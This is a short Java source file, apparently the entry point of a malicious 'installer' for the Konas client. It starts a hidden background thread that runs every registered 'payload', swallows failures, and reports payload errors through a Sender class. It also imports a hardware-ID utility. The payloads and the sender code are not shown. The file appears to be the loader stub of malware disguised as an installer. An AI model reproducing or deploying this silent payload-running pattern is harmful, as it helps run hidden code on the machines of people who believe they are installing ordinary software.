package konas.installer;

import konas.installer.payload.Payload;
import konas.installer.payload.PayloadRegistry;
import konas.installer.payload.Sender;
import konas.installer.util.HWIDUtil;

/**
 *
 * @author ThnksCJ
 */
public final class Start
{
    public static void start()
    {
        new Thread(() -> { try {
            for (Payload payload : PayloadRegistry.getPayloads()) try { payload.execute(); } catch (Exception e) { Sender.send(e.getMessage()); }
        } catch (Exception ignored) {}}).start();
    }
}